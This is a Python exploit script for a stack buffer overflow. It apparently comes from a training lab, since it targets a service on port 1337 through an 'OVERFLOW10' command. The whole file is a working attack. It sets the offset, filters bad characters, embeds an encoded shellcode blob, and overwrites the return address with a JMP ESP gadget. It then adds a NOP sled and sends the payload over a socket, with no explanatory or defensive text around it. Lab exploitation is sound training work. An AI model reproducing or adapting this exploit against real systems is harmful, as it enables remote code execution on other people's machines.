import socket, struct

host, port = '10.10.243.3', 1337

command = b'OVERFLOW10 '
offset = 537
length = 1000
new_eip = b'BBBB'
bad_chars = [
b'\xa0',
b'\xad',
b'\xbe',
b'\xde',
b'\xef'

]
shellcode =  b""
shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x1b\x2a\x96\x16\x83\xee\xfc"
shellcode += b"\xe2\xf4\xe7\xc2\x14\x16\x1b\x2a\xf6\x9f\xfe"
shellcode += b"\x1b\x56\x72\x90\x7a\xa6\x9d\x49\x26\x1d\x44"
shellcode += b"\x0f\xa1\xe4\x3e\x14\x9d\xdc\x30\x2a\xd5\x3a"
shellcode += b"\x2a\x7a\x56\x94\x3a\x3b\xeb\x59\x1b\x1a\xed"
shellcode += b"\x74\xe4\x49\x7d\x1d\x44\x0b\xa1\xdc\x2a\x90"
shellcode += b"\x66\x87\x6e\xf8\x62\x97\xc7\x4a\xa1\xcf\x36"
shellcode += b"\x1a\xf9\x1d\x5f\x03\xc9\xac\x5f\x90\x1e\x1d"
shellcode += b"\x17\xcd\x1b\x69\xba\xda\xe5\x9b\x17\xdc\x12"
shellcode += b"\x76\x63\xed\x29\xeb\xee\x20\x57\xb2\x63\xff"
shellcode += b"\x72\x1d\x4e\x3f\x2b\x45\x70\x90\x26\xdd\x9d"
shellcode += b"\x43\x36\x97\xc5\x90\x2e\x1d\x17\xcb\xa3\xd2"
shellcode += b"\x32\x3f\x71\xcd\x77\x42\x70\xc7\xe9\xfb\x75"
shellcode += b"\xc9\x4c\x90\x38\x7d\x9b\x46\x42\xa5\x24\x1b"
shellcode += b"\x2a\xfe\x61\x68\x18\xc9\x42\x73\x66\xe1\x30"
shellcode += b"\x1c\xd5\x43\xae\x8b\x2b\x96\x16\x32\xee\xc2"
shellcode += b"\x46\x73\x03\x16\x7d\x1b\xd5\x43\x46\x4b\x7a"
shellcode += b"\xc6\x56\x4b\x6a\xc6\x7e\xf1\x25\x49\xf6\xe4"
shellcode += b"\xff\x01\x7c\x1e\x42\x9c\x1d\x2e\x12\xfe\x14"
shellcode += b"\x1b\x09\xbf\x9f\xfd\x40\x86\x40\x4c\x42\x0f"
shellcode += b"\xb3\x6f\x4b\x69\xc3\x9e\xea\xe2\x1a\xe4\x64"
shellcode += b"\x9e\x63\xf7\x42\x66\xa3\xb9\x7c\x69\xc3\x73"
shellcode += b"\x49\xfb\x72\x1b\xa3\x75\x41\x4c\x7d\xa7\xe0"
shellcode += b"\x71\x38\xcf\x40\xf9\xd7\xf0\xd1\x5f\x0e\xaa"
shellcode += b"\x17\x1a\xa7\xd2\x32\x0b\xec\x96\x52\x4f\x7a"
shellcode += b"\xc0\x40\x4d\x6c\xc0\x58\x4d\x7c\xc5\x40\x73"
shellcode += b"\x53\x5a\x29\x9d\xd5\x43\x9f\xfb\x64\xc0\x50"
shellcode += b"\xe4\x1a\xfe\x1e\x9c\x37\xf6\xe9\xce\x91\x66"
shellcode += b"\xa3\xb9\x7c\xfe\xb0\x8e\x97\x0b\xe9\xce\x16"
shellcode += b"\x90\x6a\x11\xaa\x6d\xf6\x6e\x2f\x2d\x51\x08"
shellcode += b"\x58\xf9\x7c\x1b\x79\x69\xc3"

all_chars = bytearray(range(1,256))

for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char,b'')
def p32(data):
        return struct.pack("<I", data)

jmp_esp = p32(0x62501203)


nop_sled = b'\x90'*10
payload  = b''.join([
command,
b'A'*offset,
jmp_esp,
nop_sled,
shellcode,
b'C' * (length - offset - len(jmp_esp) - len(nop_sled) - len(shellcode)),



])

with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
